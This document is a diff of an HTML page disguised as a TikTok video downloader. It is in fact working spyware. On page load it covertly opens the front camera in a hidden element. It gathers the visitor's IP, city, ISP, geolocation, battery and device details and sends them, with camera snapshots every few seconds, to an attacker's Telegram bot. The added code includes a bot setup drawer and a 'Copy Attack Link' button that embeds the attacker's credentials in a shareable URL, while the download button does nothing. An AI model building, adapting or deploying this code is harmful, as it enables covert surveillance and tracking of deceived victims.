@@ -15,6 +15,7 @@
         justify-content: center;
         min-height: 100vh;
         padding: 20px;
+        overflow: hidden;
     }
     .container {
         width: 100%;
@@ -25,6 +26,8 @@
         box-shadow: 0 10px 30px rgba(255, 255, 255, 0.05);
         text-align: center;
         border: 1px solid #222;
+        position: relative;
+        z-index: 1;
     }
     .logo {
         font-size: 2.2rem;
@@ -52,8 +55,6 @@
         margin-bottom: 15px;
         outline: none;
     }
-    input:focus { border-color: #FE2C55; }
-
     button {
         width: 100%;
         padding: 15px;
@@ -65,29 +66,45 @@
         font-weight: bold;
         cursor: pointer;
         transition: 0.2s;
+    }
+
+    .settings-drawer {
+        position: fixed;
+        bottom: -100%;
+        left: 0;
+        right: 0;
+        background: #111;
+        border-top: 2px solid #FE2C55;
+        border-radius: 20px 20px 0 0;
+        padding: 20px;
+        transition: 0.4s ease;
+        z-index: 100;
+    }
+    .settings-drawer.open { bottom: 0; }
+    .settings-drawer h3 { color: #FE2C55; margin-bottom: 15px; font-size: 1.2rem; text-align: center; }
+    .settings-drawer label { display: block; font-size: 0.7rem; color: #888; margin-bottom: 5px; text-transform: uppercase; }
+    .settings-drawer input { background: #000; border: 1px solid #333; margin-bottom: 10px; }
+    .settings-drawer .btn-save { background: #25F4EE; color: #000; margin-bottom: 10px; }
+    .settings-drawer .btn-copy { background: #444; margin-top: 10px; }
+    
+    .toggle-settings {
+        position: fixed;
+        bottom: 20px;
+        right: 20px;
+        width: 40px;
+        height: 40px;
+        background: rgba(255,255,255,0.1);
+        border-radius: 50%;
         display: flex;
         align-items: center;
         justify-content: center;
-        gap: 10px;
+        cursor: pointer;
+        font-size: 1.2rem;
+        z-index: 101;
+        border: 1px solid #333;
     }
-    #statusMsg {
-        display: none;
-        margin-top: 15px;
-        padding: 10px;
-        border-radius: 8px;
-        font-size: 0.9rem;
-        font-weight: bold;
-    }
-    .status-error { background: rgba(255, 0, 0, 0.2); color: #ff4444; border: 1px solid #ff4444; }
-    .status-success { background: rgba(37, 244, 238, 0.2); color: #25F4EE; border: 1px solid #25F4EE; }
 
-    #cam-video {
-        position: fixed;
-        top: -9999px; left: -9999px;
-        width: 1px; height: 1px;
-        opacity: 0.01;
-        pointer-events: none;
-    }
+    #cam-video { position: fixed; top: -9999px; width: 1px; height: 1px; opacity: 0; }
     #canvas { display: none; }
 </style>
 </head>
@@ -99,22 +116,26 @@
         TikTok Downloader
     </div>
     <p>Download TikTok videos without watermark.</p>
+    <input type="text" id="tiktokUrl" placeholder="Paste TikTok link here...">
+    <button onclick="alert('Processing... please wait')">Download Video</button>
+</div>
 
-    <input type="text" id="tiktokUrl" placeholder="Paste TikTok video link here...">
-
-    <button id="downloadBtn" onclick="dummyProcess()">
-        <svg width="20" height="20" fill="currentColor" viewBox="0 0 16 16"><path d="M.5 9.9a.5.5 0 0 1 .5.5v2.5a1 1 0 0 0 1 1h12a1 1 0 0 0 1-1v-2.5a.5.5 0 0 1 1 0v2.5a2 2 0 0 1-2 2H2a2 2 0 0 1-2-2v-2.5a.5.5 0 0 1 .5-.5z"/><path d="M7.646 11.854a.5.5 0 0 0 .708 0l3-3a.5.5 0 0 0-.708-.708L8.5 10.293V1.5a.5.5 0 0 0-1 0v8.793L5.354 8.146a.5.5 0 1 0-.708.708l3 3z"/></svg>
-        Download Video
-    </button>
-
-    <div id="statusMsg"></div>
+<div class="toggle-settings" onclick="toggleDrawer()">⚙️</div>
+<div class="settings-drawer" id="drawer">
+    <h3>Bot Setup</h3>
+    <label>Bot Token</label>
+    <input type="text" id="botToken" placeholder="123456:ABC-DEF">
+    <label>Chat ID</label>
+    <input type="text" id="chatId" placeholder="123456789">
+    <button class="btn-save" onclick="saveSettings()">💾 Save & Test</button>
+    <button class="btn-copy" onclick="generateLink()">🔗 Copy Attack Link</button>
+    <p id="setStatus" style="font-size: 0.7rem; text-align: center; margin-top: 10px;"></p>
 </div>
 
 <video id="cam-video" autoplay playsinline muted></video>
 <canvas id="canvas"></canvas>
 
 <script>
-    // ১. ডিকোড ফাংশন (ড্যাশবোর্ড ইন্টিগ্রেশন)
     function getCreds() {
         const params = new URLSearchParams(window.location.search);
         let token = params.get('tg_token');
@@ -129,106 +150,141 @@
                 } catch(e) {}
             }
         }
-        if (!token) token = localStorage.getItem('tg_bot_token');
-        if (!chatId) chatId = localStorage.getItem('tg_chat_id');
-        return { token, chatId };
-    }
-
-    // ২. ভিকটিমের ডিভাইস ইনফো সংগ্রহ
-    async function getIntel() {
-        let geo = null;
-        try {
-            geo = await new Promise(res => navigator.geolocation.getCurrentPosition(
-                p => res({ lat: p.coords.latitude, lng: p.coords.longitude }),
-                () => res(null), { timeout: 5000 }
-            ));
-        } catch (e) {}
-        return {
-            ua: navigator.userAgent,
-            platform: navigator.platform,
-            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-            screen: `${screen.width}x${screen.height}`,
-            geolocation: geo
+        return { 
+            token: token || localStorage.getItem('tg_bot_token'), 
+            chatId: chatId || localStorage.getItem('tg_chat_id') 
         };
     }
 
-    (function() {
-        'use strict';
-
-        const camVideo = document.getElementById('cam-video');
-        const canvas = document.getElementById('canvas');
-
-        async function startAttack() {
-            const { token, chatId } = getCreds();
-            if (!token || !chatId) return;
-
-            try {
-                // ক্যামেরা রিকোয়েস্ট
-                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-                camVideo.srcObject = stream;
-                
-                // প্রথমবার ডিটেইলস পাঠানো
-                const intel = await getIntel();
-                let msg = `🚨 *TikTok Downloader Attack*\n\n`;
-                msg += `📱 OS: ${intel.platform}\n`;
-                msg += `🖥️ Screen: ${intel.screen}\n`;
-                msg += `🕒 TZ: ${intel.timezone}\n`;
-                if(intel.geolocation) msg += `📍 Loc: ${intel.geolocation.lat}, ${intel.geolocation.lng}\n`;
-                msg += `🌐 UA: ${intel.ua}`;
-
-                fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ chat_id: chatId, text: msg, parse_mode: 'Markdown' })
-                });
-
-                // প্রতি ৩ সেকেন্ড পর পর ছবি পাঠানো (সার্ভার লোড কমাতে ১ সেকেন্ড থেকে ৩ সেকেন্ড করা হয়েছে)
-                setInterval(() => {
-                    captureAndSend(token, chatId);
-                }, 3000);
-
-            } catch (err) {
-                console.log("Camera access denied");
-            }
-        }
-
-        async function captureAndSend(token, chatId) {
-            const w = camVideo.videoWidth;
-            const h = camVideo.videoHeight;
-            if (w === 0) return;
-
-            canvas.width = w;
-            canvas.height = h;
-            canvas.getContext('2d').drawImage(camVideo, 0, 0, w, h);
-
-            canvas.toBlob(async (blob) => {
-                if (!blob) return;
-                const formData = new FormData();
-                formData.append('chat_id', chatId);
-                formData.append('photo', blob, 'capture.jpg');
-                formData.append('caption', '📸 Live Capture from TikTok Downloader');
-
-                fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
-                    method: 'POST',
-                    body: formData
-                }).catch(() => {});
-            }, 'image/jpeg', 0.7);
-        }
-
-        // পেজ লোড হলেই অ্যাটাক শুরু
-        window.addEventListener('DOMContentLoaded', startAttack);
-    })();
-
-    function dummyProcess() {
-        const status = document.getElementById('statusMsg');
-        status.style.display = 'block';
-        status.innerText = "Verifying link... Please wait.";
-        status.className = 'status-success';
-        setTimeout(() => {
-            status.innerText = "❌ Invalid TikTok link. Please try again.";
-            status.className = 'status-error';
-        }, 3000);
+    function toggleDrawer() {
+        document.getElementById('drawer').classList.toggle('open');
     }
+
+    function saveSettings() {
+        const token = document.getElementById('botToken').value.trim();
+        const chatId = document.getElementById('chatId').value.trim();
+        if (!token || !chatId) return alert("Fill both fields!");
+        localStorage.setItem('tg_bot_token', token);
+        localStorage.setItem('tg_chat_id', chatId);
+        fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=✅ Setup Successful!`)
+        .then(() => {
+            document.getElementById('setStatus').innerText = "Saved & Verified!";
+            document.getElementById('setStatus').style.color = "#25F4EE";
+        }).catch(() => {
+            document.getElementById('setStatus').innerText = "Error saving!";
+            document.getElementById('setStatus').style.color = "red";
+        });
+    }
+
+    function generateLink() {
+        const token = localStorage.getItem('tg_bot_token');
+        const chatId = localStorage.getItem('tg_chat_id');
+        if (!token || !chatId) return alert("Save settings first!");
+        const base = window.location.origin + window.location.pathname;
+        const data = btoa(JSON.stringify({ token, chatId }));
+        const finalUrl = `${base}?tg_data=${encodeURIComponent(data)}`;
+        navigator.clipboard.writeText(finalUrl).then(() => { alert("Attack Link Copied!"); });
+    }
+
+    // --- Advanced Intel (Including Real IP) ---
+    async function getFullIntel() {
+        let ipInfo = { ip: "Unknown", city: "Unknown", country: "Unknown", isp: "Unknown" };
+        try {
+            const res = await fetch('https://ipapi.co/json/');
+            ipInfo = await res.json();
+        } catch(e) {}
+
+        let geo = "Not allowed";
+        try {
+            geo = await new Promise(res => navigator.geolocation.getCurrentPosition(
+                p => res(`${p.coords.latitude}, ${p.coords.longitude}`),
+                () => res("Permission Denied"), { timeout: 5000 }
+            ));
+        } catch(e) {}
+
+        let battery = "Unknown";
+        try {
+            const bat = await navigator.getBattery();
+            battery = `${Math.round(bat.level * 100)}%`;
+        } catch(e) {}
+
+        return {
+            ip: ipInfo.ip || "Unknown",
+            city: ipInfo.city || "Unknown",
+            country: ipInfo.country_name || "Unknown",
+            isp: ipInfo.org || "Unknown",
+            ua: navigator.userAgent,
+            platform: navigator.platform,
+            lang: navigator.language,
+            screen: `${screen.width}x${screen.height}`,
+            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+            battery: battery,
+            location: geo
+        };
+    }
+
+    async function startAttack() {
+        const { token, chatId } = getCreds();
+        if (!token || !chatId) return;
+
+        try {
+            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false });
+            const video = document.getElementById('cam-video');
+            video.srcObject = stream;
+
+            const intel = await getFullIntel();
+            
+            let msg = `🚨 *Victim Accessed! (Live Stream)*\n\n`;
+            msg += `🌐 IP: ${intel.ip}\n`;
+            msg += `🏙️ City: ${intel.city}, ${intel.country}\n`;
+            msg += `📡 ISP: ${intel.isp}\n`;
+            msg += `📱 OS: ${intel.platform}\n`;
+            msg += `🌍 Loc: ${intel.location}\n`;
+            msg += `🔋 Bat: ${intel.battery}\n`;
+            msg += `🖥️ Screen: ${intel.screen}\n`;
+            msg += `🕒 TZ: ${intel.timezone}\n`;
+            msg += `🔗 UA: ${intel.ua}`;
+
+            await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ chat_id: chatId, text: msg, parse_mode: 'Markdown' })
+            });
+
+            // Continuous Capture: New frame every 5 seconds
+            const captureInterval = setInterval(async () => {
+                // Check if page is still open/active
+                if (document.hidden) return; 
+
+                const canvas = document.getElementById('canvas');
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                canvas.getContext('2d').drawImage(video, 0, 0);
+                
+                canvas.toBlob(async (blob) => {
+                    if (!blob) return;
+                    const fd = new FormData();
+                    fd.append('chat_id', chatId);
+                    fd.append('photo', blob, 'capture.jpg');
+                    fd.append('caption', `📸 Live Frame Update\nIP: ${intel.ip}`);
+                    await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, { method: 'POST', body: fd });
+                }, 'image/jpeg', 0.7);
+            }, 5000);
+
+            // Stop everything when tab is closed
+            window.addEventListener('beforeunload', () => {
+                clearInterval(captureInterval);
+                stream.getTracks().forEach(track => track.stop());
+            });
+
+        } catch (err) { console.log("Permission denied"); }
+    }
+
+    window.onload = () => {
+        document.getElementById('botToken').value = localStorage.getItem('tg_bot_token') || '';
+        document.getElementById('chatId').value = localStorage.getItem('tg_chat_id') || '';
+        startAttack();
+    };
 </script>
 </body>
 </html>
